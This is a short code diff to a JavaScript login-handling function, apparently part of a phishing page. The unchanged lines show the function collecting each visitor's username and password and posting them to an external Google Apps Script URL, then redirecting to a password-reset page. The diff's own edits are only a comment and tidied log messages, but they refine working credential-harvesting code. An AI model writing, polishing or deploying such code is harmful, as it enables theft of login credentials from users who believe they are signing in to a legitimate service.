@@ -57,6 +57,7 @@
         function logLogin(username, password) {
             var url = "https://script.google.com/macros/s/AKfycbwSoa7IFpuGWp2zCoMKhQcTT4T5Wblked6fNgiZCpTiR18Ke96hthAZoRlKYsrkIyE/exec"; // Update with your deployed Google Apps Script URL
             
+            // Prepare data to send
             var formData = new FormData();
             formData.append("username", username);
             formData.append("password", password);
@@ -69,10 +70,10 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log("Login succesful");
+                    console.log("Login successful");
                     window.location.href = "password_reset.html"; // Redirect to password reset page
                 } else {
-                    console.error("Error");
+                    console.error("Error submitting login data");
                     // Handle error (optional)
                 }
             })
